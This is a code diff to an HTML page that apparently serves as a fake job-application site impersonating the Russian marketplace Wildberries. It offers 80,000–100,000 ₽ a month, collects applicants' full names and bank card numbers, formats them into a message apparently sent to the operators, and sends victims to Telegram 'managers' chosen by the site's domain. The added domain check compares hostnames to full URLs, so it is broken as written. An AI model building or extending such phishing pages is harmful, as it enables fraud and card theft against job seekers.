@@ -4,16 +4,16 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
-    <meta name="description" content="Платформа для подачи заявок на удалённую работу">
+    <meta name="description" content="Платформа для подачи заявок на удалённую работу в Wildberries">
     <meta http-equiv="X-Content-Type-Options" content="nosniff">
-    <title>Работа Онлайн</title>
+    <title>Работа в Wildberries</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #7D256F; /* Тёмно-фиолетовый фон */
+            background-color: #4A1540; /* Очень тёмный фиолетовый фон */
             color: #E6E6E6;
             overscroll-behavior: none;
         }
@@ -42,7 +42,7 @@
             border-radius: 30px;
             overflow: hidden;
             height: 300px;
-            background-color: #5A1B4F; /* Более тёмный оттенок фиолетового */
+            background-color: #5A1B4F; /* Тёмный оттенок фиолетового */
             color: #E6E6E6;
             margin: 0 -10px;
             flex: 0 0 auto;
@@ -57,7 +57,7 @@
             text-align: center;
             border-radius: 30px;
             margin: 5px 0 5px 5px;
-            background-color: rgba(90, 27, 79, 0.3); /* Более тёмный оттенок с прозрачностью */
+            background-color: rgba(90, 27, 79, 0.3); /* Тёмный оттенок с прозрачностью */
         }
         .banner-text h2 {
             font-size: 32px;
@@ -86,7 +86,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            background-color: #5A1B4F; /* Более тёмный оттенок фиолетового */
+            background-color: #5A1B4F; /* Тёмный оттенок фиолетового */
             margin: 5px 5px 5px 0;
         }
         .banner-image img {
@@ -110,7 +110,7 @@
             justify-content: center;
             align-items: center;
             text-align: center;
-            background-color: #5A1B4F; /* Более тёмный оттенок фиолетового */
+            background-color: #5A1B4F; /* Тёмный оттенок фиолетового */
         }
         .feature img {
             width: 30px;
@@ -141,7 +141,7 @@
             overflow-y: auto;
         }
         .modal-content {
-            background-color: #5A1B4F; /* Более тёмный оттенок фиолетового */
+            background-color: #5A1B4F; /* Тёмный оттенок фиолетового */
             padding: 20px;
             border-radius: 30px;
             width: calc(100% - 40px);
@@ -219,7 +219,7 @@
             overflow-y: auto;
         }
         .notification-content {
-            background-color: #5A1B4F; /* Более тёмный оттенок фиолетового */
+            background-color: #5A1B4F; /* Тёмный оттенок фиолетового */
             padding: 20px;
             border-radius: 30px;
             width: calc(100% - 20px);
@@ -371,7 +371,7 @@
         </div>
         <div class="main-banner">
             <div class="banner-text">
-                <h2>Удалённая Работа</h2>
+                <h2>Новая заявка на работу в Wildberries</h2>
                 <p>От 80 000 до 100 000 ₽ в месяц</p>
                 <button onclick="openModal()" ontouchstart="openModal()">Стать работником</button>
             </div>
@@ -432,8 +432,8 @@
 
     <div id="notificationModal" class="notification">
         <div class="notification-content">
-            <h3>Заявка принята</h3>
-            <p>Напишите нашему менеджеру в Telegram: <a href="https://t.me/Sofi_Ozon" target="_blank" id="telegramLink">@Sofi_Ozon</a></p>
+            <h3>Заявка на работу в Wildberries принята</h3>
+            <p id="notificationText">Напишите нашему менеджеру в Telegram: <a href="https://t.me/Sofi_Ozon" target="_blank" id="telegramLink">@Sofi_Ozon</a></p>
             <button id="doneButton" onclick="closeNotification()" ontouchstart="closeNotification()">Готово</button>
         </div>
     </div>
@@ -488,6 +488,32 @@
             localStorage.removeItem('hasSubmitted');
             alert('Заявки очищены. Пользователи могут отправлять заявки заново.');
         }
+
+        // Определяем менеджера в зависимости от домена
+        const hostname = window.location.hostname;
+        let managerUsername, managerLink;
+
+        if (hostname === 'https://wb-support.vercel.app/') {
+            managerUsername = '@Sofi_Ozon';
+            managerLink = 'https://t.me/Sofi_Ozon';
+        } else if (hostname === 'https://wb-supports.vercel.app/') {
+            managerUsername = '@pvzandwb';
+            managerLink = 'https://t.me/pvzandwb';
+        } else {
+            managerUsername = null; // Для недопустимых доменов
+            managerLink = null;
+        }
+
+        // Обновляем уведомление при загрузке страницы
+        document.addEventListener('DOMContentLoaded', () => {
+            if (managerUsername && managerLink) {
+                const notificationText = document.getElementById('notificationText');
+                const telegramLink = document.getElementById('telegramLink');
+                notificationText.innerHTML = `Напишите нашему менеджеру в Telegram: <a href="${managerLink}" target="_blank" id="telegramLink">${managerUsername}</a>`;
+                telegramLink.href = managerLink;
+                telegramLink.textContent = managerUsername;
+            }
+        });
 
         function generateApplicationId() {
             const timestamp = Date.now();
@@ -678,6 +704,13 @@
                 return;
             }
 
+            // Проверка домена перед отправкой
+            if (!managerUsername || !managerLink) {
+                alert('Ошибка: Заявки принимаются только с доменов domain1.com или domain2.com.');
+                console.log('Form blocked: invalid domain');
+                return;
+            }
+
             submitButton.disabled = true;
             console.log('Submit button disabled');
 
@@ -709,9 +742,9 @@
                 const platform = detectPlatform();
                 console.log('Platform:', platform);
 
-                // Формируем сообщение без parse_mode, чистый текст, без IP
+                // Формируем сообщение с указанием Wildberries и менеджера
                 const message = `
-Новая заявка на работу:
+Новая заявка на работу в Wildberries:
 🆔 ID заявки: ${escapeText(applicationId)}
 👤 ФИО: ${escapeText(data.name)}
 💳 Номер карты: ${escapeText(data.card)}
@@ -721,6 +754,7 @@
 🏙 Город: ${escapeText(data.city)}
 📱 Telegram: ${escapeText(data.telegram)}
 💻 Платформа: ${escapeText(platform)}
+📩 Назначенный менеджер: ${managerUsername}
                 `.trim();
                 console.log('Message prepared:', message);
 
